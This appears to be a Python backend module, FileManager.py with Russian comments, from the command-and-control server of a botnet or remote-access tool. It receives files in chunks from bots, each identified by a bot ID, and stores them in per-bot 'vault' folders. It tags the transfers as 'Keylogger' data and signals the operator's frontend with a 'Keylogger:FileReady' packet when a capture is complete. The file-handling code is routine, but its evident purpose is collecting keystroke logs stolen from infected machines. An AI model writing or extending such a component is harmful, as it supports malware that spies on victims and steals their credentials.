# backend\Services\FileManager.py
import time
import json
from pathlib import Path
from typing import Dict, Any, Optional
import backend.LoggerWrapper as logger
from backend.Services import pack_packet
from backend.API import manager

class FileManager:
    def __init__(self):
        self.vault_base = Path("storage") / "vault"
        self.active_transfers: Dict[str, Dict[str, Any]] = {}
        self.TIMEOUT = 10.0

    def init_transfer(self, bot_id: str, filename: str, total_size: int):
        """Регистрация нового файла (Анонс)"""
        bot_path = self.vault_base / bot_id
        bot_path.mkdir(parents=True, exist_ok=True)
        
        transfer_key = f"{bot_id}_{filename}"
        file_path = bot_path / filename
        
        # Очищаем файл если он был
        with open(file_path, "wb") as f: f.truncate(0)
        
        self.active_transfers[transfer_key] = {
            "path": file_path,
            "total": total_size,
            "received": 0,
            "last_active": time.time(),
            "module": "Keylogger" # Можно расширить под FileTransfer
        }
        logger.Log.info(f"[FileManager] Init: {filename} ({total_size} bytes) from {bot_id}")

    async def write_chunk(self, bot_id: str, filename: str, chunk: bytes):
        """Запись куска файла (Stream)"""
        transfer_key = f"{bot_id}_{filename}"
        state = self.active_transfers.get(transfer_key)
        
        if not state:
            return

        # Проверка таймаута
        if time.time() - state["last_active"] > self.TIMEOUT:
            self._cleanup_failed(transfer_key)
            return

        try:
            with open(state["path"], "ab") as f:
                f.write(chunk)
            
            state["received"] += len(chunk)
            state["last_active"] = time.time()

            # Финишная прямая
            if state["received"] >= state["total"]:
                logger.Log.success(f"[FileManager] Finished: {filename} from {bot_id}")
                # Уведомляем фронтенд о готовности файла
                ready_msg = json.dumps({"file": filename, "path": str(state["path"])})
                manager.broadcast_packet_sync(pack_packet(bot_id, "Keylogger:FileReady", ready_msg))
                self.active_transfers.pop(transfer_key)
        except Exception as e:
            logger.Log.error(f"[FileManager] Write error: {e}")
            self._cleanup_failed(transfer_key)

    def _cleanup_failed(self, key: str):
        state = self.active_transfers.pop(key, None)
        if state and state["path"].exists():
            state["path"].unlink()
            logger.Log.error(f"[FileManager] Transfer timeout or error. Deleted: {state['path'].name}")

# Глобальный инстанс для удобного импорта
file_service = FileManager()